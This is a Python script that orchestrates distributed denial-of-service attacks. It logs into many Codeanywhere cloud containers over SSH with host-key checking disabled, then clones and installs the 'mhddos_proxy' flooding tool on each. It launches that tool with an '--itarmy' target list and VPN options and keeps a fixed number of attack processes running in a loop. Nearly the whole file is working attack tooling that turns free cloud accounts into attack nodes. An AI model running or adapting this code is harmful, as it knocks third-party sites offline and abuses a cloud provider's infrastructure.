"""
attacks with mh via codeanywhere

"""

import argparse
import logging
import os
import shlex
import subprocess
import sys
import time

from utils.caw_restart import restart

MSG_FORMAT = '%(asctime)s:%(levelname)s: %(message)s'

logging.getLogger().setLevel(logging.INFO)
logging.basicConfig(format=MSG_FORMAT)

CAW_KEYS_DIR = f'caw_keys{os.sep}'

INSTALL_COMMAND = (
    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
    '-t "rm -rf ./mhddos_proxy && git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git '
    '&& /home/cabox/.pyenv/shims/pip3 install -r ./mhddos_proxy/requirements.txt"'
)
ATTACK_COMMAND = (
    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
    '-t "cd ./mhddos_proxy && ./runner.sh /home/cabox/.pyenv/shims/python3 --lang en --vpn --copies auto --itarmy"'
)


class Attack:
    """
    class to attack with mh via codeanywhere

    """

    def __init__(self):
        self.configurations = []
        self.number = 0
        self.iter_configurations = iter([])
        self.installations = []
        self.attacks = []

    def make_hosts(self, number):
        """
        makes list of hosts

        :param number: a number of ssh connections

        """
        self.configurations = next(os.walk(CAW_KEYS_DIR))[-1]

        if self.configurations:
            logging.info('codeanywhere hosts: %s', ", ".join(self.configurations))
            self.number = min(len(self.configurations), number)
            self.iter_configurations = iter(self.configurations)
        else:
            logging.warning('there is no codeanywhere host')

    def make_installations(self):
        """
        makes installations on all configurations

        """
        os.makedirs('logs', exist_ok=True)

        for configuration in self.configurations:
            email, host, port = configuration.split('__')

            install_command = INSTALL_COMMAND.format(
                caw_keys_dir=CAW_KEYS_DIR,
                email=email,
                host=host,
                port=port
            )
            logging.info('install command formed: %s', install_command)

            try:
                restart(email, os.environ['CAW_PASSWORD'])
                time.sleep(120)
            except Exception as e:
                logging.error('container was not restarted: %s', e)
                continue

            with open(f'logs{os.sep}caw__{configuration}.log', 'w') as log:
                process = subprocess.Popen(
                    shlex.split(install_command),
                    stdout=log,
                    stderr=log
                )
                logging.info(
                    'codeanywhere host %s: installation started, pid %d',
                    host,
                    process.pid
                )
                self.installations.append(process)

        while self.installations:
            for process in self.installations:
                code = process.poll()

                if code is not None:
                    self.installations.remove(process)
                    logging.info('installation finished, pid %d, return code: %d', process.pid, code)

    def make_attack(self):
        """
        makes process with ssh connect and runs command

        """
        configuration = next(self.iter_configurations, None)

        if configuration is None and self.configurations:
            self.iter_configurations = iter(self.configurations)

        if configuration:
            os.makedirs('logs', exist_ok=True)
            email, host, port = configuration.split('__')

            attack_command = ATTACK_COMMAND.format(
                caw_keys_dir=CAW_KEYS_DIR,
                email=email,
                host=host,
                port=port
            )
            logging.info('attack command formed: %s', attack_command)

            try:
                restart(email, os.environ['CAW_PASSWORD'])
                time.sleep(120)
            except Exception as e:
                logging.error('container was not restarted: %s', e)

            with open(f'logs{os.sep}caw__{configuration}.log', 'w') as log:
                process = subprocess.Popen(
                    shlex.split(attack_command),
                    stdout=log,
                    stderr=log
                )
                logging.info(
                    'codeanywhere host %s: attack started, pid %d',
                    host,
                    process.pid
                )
                self.attacks.append(process)

    def start(self):
        """
        starts attack with mh via codeanywhere

        """
        for _ in range(self.number):
            self.make_attack()

        while self.attacks:
            for process in self.attacks:
                code = process.poll()

                if code is not None:
                    self.attacks.remove(process)
                    logging.info('attack finished, pid %d, return code: %d', process.pid, code)

                if len(self.attacks) < self.number:
                    self.make_attack()

            time.sleep(5.)


def main():
    """
    attacks with mh via codeanywhere

    """
    parser = argparse.ArgumentParser(
        description='auto-attack with mh via codeanywhere in parallel',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--number', type=int, default=7, help='number of ssh connections')
    parser.add_argument('--mode', type=str, default='attack', choices=['attack', 'install'],
                        help='mode to run: install, attack (default: attack)')
    args = parser.parse_args()

    attack = Attack()

    try:
        logging.info('press ctrl+c to stop attack')

        if args.mode == 'install':
            attack.make_hosts(args.number)
            attack.make_installations()
            logging.info('all of installation completed')
            sys.exit()

        while True:
            attack.make_hosts(args.number)

            if not attack.configurations:
                sys.exit()

            attack.start()

    except KeyboardInterrupt:
        for process in attack.attacks:
            process.terminate()

        logging.info('attack interrupted')
        sys.exit()


if __name__ == '__main__':
    main()
